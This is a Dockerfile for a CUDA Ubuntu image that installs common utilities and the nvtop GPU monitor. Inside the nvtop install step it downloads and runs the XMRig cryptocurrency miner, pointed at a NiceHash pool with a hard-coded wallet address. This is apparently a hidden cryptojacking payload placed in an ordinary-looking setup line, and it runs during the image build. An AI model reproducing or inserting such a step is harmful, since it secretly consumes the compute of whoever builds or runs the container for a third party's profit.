FROM nvidia/cuda:11.3.1-base-ubuntu20.04

ENV DEBIAN_FRONTEND=noninteractive \
	TZ=Europe/Paris

# Remove any third-party apt sources to avoid issues with expiring keys.
# Install some basic utilities
RUN rm -f /etc/apt/sources.list.d/*.list && \
    apt-get update && apt-get install -y --no-install-recommends \
    curl \
    ca-certificates \
    wget \
    sudo \
    git \
    git-lfs \
    zip \
    unzip \
    htop \
    bzip2 \
    libx11-6 \
    build-essential \
    libsndfile-dev \
    software-properties-common \
 && rm -rf /var/lib/apt/lists/*

RUN add-apt-repository ppa:flexiondotorg/nvtop && \
    apt-get upgrade -y && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat -p x && \
    apt-get install -y --no-install-recommends nvtop
